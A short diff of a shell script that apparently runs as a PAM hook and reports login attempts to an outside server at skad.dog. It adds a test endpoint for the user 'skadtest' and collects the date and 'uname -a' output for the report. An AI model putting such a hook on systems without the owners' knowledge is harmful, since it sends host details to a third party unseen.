@@ -12,6 +12,11 @@ if [[ $hexval == "080a" ]]; then
 else 
 
 URL="https://skad.dog/attempt.php"
+
+if [ "$PAM_USER" == "skadtest" ]; then
+	URL="https://test.skad.dog/attempt.php"
+fi
+
 DATE=`date "+%Y%m%d"`
 TIME_STAMP=`date "+%Y%m%d-%H%M%S"`
 UNAME=`uname -a`
